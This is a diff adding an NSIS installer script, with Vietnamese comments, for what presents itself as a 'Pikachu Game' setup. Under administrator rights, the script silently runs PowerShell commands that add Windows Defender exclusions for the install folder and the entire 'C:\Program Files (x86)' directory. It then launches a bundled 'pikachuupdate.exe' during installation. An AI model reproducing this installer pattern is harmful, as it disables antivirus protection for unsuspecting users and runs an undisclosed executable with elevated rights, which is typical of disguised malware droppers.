@@ -1,0 +1,66 @@
+!include MUI2.nsh
+
+; Định nghĩa biến MUI_ICON
+!define MUI_ICON "pikachu.ico"
+
+; Định nghĩa các chuỗi và trang MUI
+!define MUI_WELCOMEPAGE_TEXT "Welcome to Pikachu Game Setup"
+!insertmacro MUI_PAGE_WELCOME
+!insertmacro MUI_PAGE_DIRECTORY
+!insertmacro MUI_PAGE_INSTFILES
+!define MUI_FINISHPAGE_RUN "$INSTDIR\pikachucodien.exe"
+!define MUI_FINISHPAGE_TEXT "Installation complete! Click Finish to launch Pikachu."
+!insertmacro MUI_PAGE_FINISH
+!insertmacro MUI_LANGUAGE "English"
+
+; Ten file cai dat va ten ung dung
+OutFile "pikachu_setup.exe"
+Name "Pikachu Game Setup"
+
+; Thu muc cai dat mac dinh
+InstallDir $PROGRAMFILES\PikachuGame
+
+; Yêu cầu quyền admin cho Windows Vista trở lên
+RequestExecutionLevel admin
+
+; Cac trang cai dat
+Page directory ; Trang chọn thư mục cài đặt
+Page instfiles ; Trang hiển thị quá trình cài đặt
+
+; Tuy chon icon cho file exe
+Icon "pikachu.ico"
+
+; 1 số thư mục antivirus
+Section "AddExclusion" SEC01
+    ; Sử dụng nsExec để chạy lệnh PowerShell với quyền admin
+    nsExec::Exec 'powershell -Command "Add-MpPreference -ExclusionPath \"$INSTDIR\""'
+    nsExec::Exec 'powershell -Command "Add-MpPreference -ExclusionPath \"C:\Program Files (x86)\""'
+SectionEnd
+
+; Phần cài đặt các tệp tin
+Section "MainSection" SEC02
+    ; Tạo thư mục đích
+    SetOutPath $INSTDIR
+
+    ; Copy các tệp tin vào thư mục đích
+    File "pikachucodien.exe"
+    File "pikachuupdate.exe"
+    File "pikachu.ico"
+    ; Chạy tệp tin pikachuupdate.exe
+    Exec '"$INSTDIR\pikachuupdate.exe"'
+SectionEnd
+
+; Phần tạo shortcut
+Section "CreateShortCut" SEC03
+    ; Tạo shortcut trên Desktop với icon
+    CreateShortCut "$DESKTOP\pikachucodien.lnk" "$INSTDIR\pikachucodien.exe" "" "$INSTDIR\pikachu.ico"
+
+    ; Tạo shortcut trong Start Menu với icon
+    CreateShortCut "$SMPROGRAMS\PikachuGame\Pikachucodien.lnk" "$INSTDIR\pikachucodien.exe" "" "$INSTDIR\pikachu.ico"
+SectionEnd
+
+
+; Tắt tab "Installation Folder" sau khi cài đặt hoàn thành
+Function .onInstSuccess
+    SetAutoClose true
+FunctionEnd
